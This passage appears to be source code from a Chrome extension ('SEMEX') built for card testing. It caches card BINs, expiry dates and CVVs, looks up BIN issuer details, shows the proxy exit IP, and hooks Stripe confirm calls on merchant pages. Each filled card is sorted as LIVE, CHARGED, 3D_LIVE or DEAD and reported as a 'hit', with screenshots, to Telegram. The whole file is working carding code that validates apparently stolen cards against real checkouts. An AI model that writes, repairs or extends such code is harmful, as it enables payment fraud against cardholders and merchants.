      // Merge ONLY into a cache provably owned by this account — if the owner
      // differs (account switched) start fresh, so a previous account's
      // BINs/CVVs are never retagged as this account's.
      try {
        const _semexC0 = await chrome.storage.local.get(["savedBinsCache", "savedBinsOwner", _SK_UP]);
        const _semexU3 = _semexC0[_SK_UP] || {};
        const _semexMe3 = _semexU3.email || _semexU3.id || _semexU3.telegramId || _semexU3.telegram_id || null;
        // Merge eligibility: the identity at cache-read time must equal the
        // INITIATING owner — otherwise an A→B→A session flip could read B's
        // cache and write it tagged as A.
        const _semexList = (_semexMe3 && _semexMe3 === _semexSaveOwner && _semexC0.savedBinsOwner === _semexMe3) ? _semexNormalizeBinList(_semexC0.savedBinsCache) : [];
        if (_semexMe3 && _semexMe3 === _semexSaveOwner && !_semexList.some(_0xb => String(_0xb && _0xb.bin) === _semexBinDigits)) {
          const _semexNewRec = _semexNormalizeBinRec({
            bin: _semexBinDigits,
            label: _semexSaveReq.label || null,
            expiry: _semexSaveReq.expiry || null,
            cvv: _semexSaveReq.cvv || null
          });
          if (_semexNewRec) {
            _semexList.unshift(_semexNewRec);
            // Final identity check immediately before the write — an account
            // change between the guard above and here aborts the mirror.
            const _semexU5 = (await chrome.storage.local.get([_SK_UP]))[_SK_UP] || {};
            const _semexMe5 = _semexU5.email || _semexU5.id || _semexU5.telegramId || _semexU5.telegram_id || null;
            if (_semexMe5 && _semexMe5 === _semexSaveOwner) {
              await chrome.storage.local.set({ savedBinsCache: _semexList, savedBinsOwner: _semexSaveOwner });
            }
          }
        }
      } catch (_e3) {}
      _semexSaveRespond({ ok: true });
    } catch (_semexSaveErr) {
      _semexSaveRespond({ ok: false, error: String((_semexSaveErr && _semexSaveErr.message) || _semexSaveErr) });
    }
  })();
  return true;
});

/* BIN detail lookup for the overlay's live-card info row. Public endpoint — no auth needed. */
chrome.runtime.onMessage.addListener(function(_semexBinInfoReq, _semexBinInfoSender, _semexBinInfoResp) {
  if (!_semexBinInfoReq || _semexBinInfoReq.type !== "SEMEX_GET_BIN_INFO") return false;
  const _semexBin6 = String(_semexBinInfoReq.bin6 || "").replace(/\D/g, "").slice(0, 8);
  if (_semexBin6.length < 6) { _semexBinInfoResp({ ok: false, error: "invalid_bin" }); return false; }
  const _semexBinUrl = (typeof serverClient !== "undefined" && serverClient && serverClient.baseUrl
    ? serverClient.baseUrl : "https://api.semxhitter.pw") + "/api/bin/" + _semexBin6;
  fetch(_semexBinUrl, { cache: "force-cache" })
    .then(_r => _r.ok ? _r.json() : Promise.reject("HTTP " + _r.status))
    .then(_d => _semexBinInfoResp({
      ok: true, brand: _d.brand || null, cardType: _d.cardType || _d.type || null,
      level: _d.level || null, bank: _d.bank || null,
      country: _d.country || null, countryCode: _d.countryCode || null, flag: _d.flag || null
    }))
    .catch(_e => _semexBinInfoResp({ ok: false, error: String(_e) }));
  return true;
});

/* Proxy exit-IP fetch for the overlay IP display row. */
chrome.runtime.onMessage.addListener(function(_semexIpReq, _semexIpSender, _semexIpResp) {
  if (!_semexIpReq || _semexIpReq.type !== "SEMEX_GET_IP") return false;
  const _semexT0 = Date.now();
  fetch("https://ipwho.is/?fields=ip,country,country_code", { cache: "no-store" })
    .then(_r => _r.ok ? _r.json() : Promise.reject("err"))
    .then(_d => _semexIpResp({ ok: true, ip: _d.ip, country: _d.country || null, countryCode: _d.country_code || null, latency: Date.now() - _semexT0 }))
    .catch(() => fetch("https://api.ipify.org?format=json", { cache: "no-store" })
      .then(_r => _r.ok ? _r.json() : Promise.reject("err"))
      .then(_d => _semexIpResp({ ok: true, ip: _d.ip, country: null, countryCode: null, latency: Date.now() - _semexT0 }))
      .catch(_e => _semexIpResp({ ok: false, error: String(_e) }))
    );
  return true;
});

/* ============================================================
 * INBUILT STRIPE COVERAGE — Payment Element / SetupIntent
 * ============================================================
 * When a merchant page uses Stripe's Payment Element (no redirect),
 * the hit is detected two ways:
 *   (a) Network interceptor in the elements-inner iframe fires PAYMENT_RESULT.
 *   (b) confirmCardPayment/confirmPayment/confirmSetup resolve → interceptor.js
 *       fires SEMEX_STRIPE_CONFIRM_RESULT → content.js bridges here.
 * This block handles path (b) as a safety net so no hit is ever missed.
 *
 * Card cache: piggyback on RELAY_CARD_DATA (which already fires when any
 * card fill completes) to keep the last card object per tab.  The FALSE-CHARGED
 * GUARD in the main PAYMENT_RESULT handler requires a valid card object, so
 * we must pass it through from the fill event.
 * ============================================================ */
const _semexCardByTab = (self._semexCardByTab = self._semexCardByTab || new Map());
const _semexConfirmStartByTab = (self._semexConfirmStartByTab = self._semexConfirmStartByTab || new Map());

chrome.runtime.onMessage.addListener(function(_scMsg, _scSender) {
  // 1. Cache card on every fill so the confirm path can look it up.
  if (_scMsg && _scMsg.type === "RELAY_CARD_DATA" && _scSender && _scSender.tab) {
    try {
      if (_scMsg.card && (_scMsg.card.number || _scMsg.card.cc)) {
        _semexCardByTab.set(_scSender.tab.id, _scMsg.card);
        // Prune stale entries so the map never grows unbounded.
        if (_semexCardByTab.size > 60) {
          const _oldest = _semexCardByTab.keys().next().value;
          _semexCardByTab.delete(_oldest);
        }
      }
    } catch (_e) {}
  }

  // 2. Record confirm starts — our interceptor wrapper always posts
  //    SEMEX_STRIPE_CONFIRM_START immediately before calling the merchant's
  //    original confirm fn. A RESULT with no recent START on the same tab did
  //    not come from the wrapper (page-forged postMessage) and is dropped.
  if (_scMsg && _scMsg.type === "SEMEX_STRIPE_CONFIRM_START" && _scSender && _scSender.tab) {
    try { _semexConfirmStartByTab.set(_scSender.tab.id, Date.now()); } catch (_eCS) {}
    return;
  }

  // 3. Handle confirm result: map Stripe intent status → PAYMENT_RESULT pipeline.
  if (_scMsg && _scMsg.type === "SEMEX_STRIPE_CONFIRM_RESULT" && _scSender && _scSender.tab) {
    const _cTid  = _scSender.tab.id;
    const _cStat = _scMsg.status;
    const _cMethod = String(_scMsg.method || "");
    // Anti-forgery: real Stripe intents are pi_/seti_ prefixed. The wrapper
    // reads this id off the resolved PaymentIntent/SetupIntent object, so any
    // message without a plausible id never touched Stripe.
    if (!/^(pi|seti)_[A-Za-z0-9]{10,}$/.test(String(_scMsg.id || ""))) return;
    // Anti-forgery: require a confirm START within the last 30s on this tab.
    const _cStartTs = _semexConfirmStartByTab.get(_cTid) || 0;
    if (!_cStartTs || (Date.now() - _cStartTs) > 30000) return;
    // Map Stripe intent status to a SEMEX status string.
    // CRITICAL: confirmSetup success = card SAVED (SetupIntent), not charged —
    // map to LIVE, never CHARGED, or a saved-card page reports a fake CHARGED.
    let _semexMappedStatus = null;
    if (_cStat === "succeeded") {
      _semexMappedStatus = (_cMethod === "confirmSetup") ? "LIVE" : "CHARGED";
    }
    else if (_cStat === "requires_action")                               _semexMappedStatus = "3D_LIVE";
    else if (_cStat === "requires_payment_method" || _cStat === "canceled") _semexMappedStatus = "DEAD";
    // "processing" = Stripe is still working; wait for the follow-up webhook / poll.
    if (!_semexMappedStatus) return;

    const _cCard = _semexCardByTab.get(_cTid) || null;
    // Drop if we have no card — this wasn't our fill session.
    if (!_cCard) return;

    // Forward to content.js so the hit goes through the existing PAYMENT_RESULT
    // pipeline with the correct sender-tab context (dedup, screenshot, Telegram).
    try {
      chrome.tabs.sendMessage(_cTid, {
        type: "SEMEX_STRIPE_CONFIRM_HIT",
        status: _semexMappedStatus,
        card:   _cCard,
        intentId: _scMsg.id   || null,
        method:   _scMsg.method || null
      }, { frameId: 0 }, () => { void chrome.runtime.lastError; });
    } catch (_e) {}
  }
});
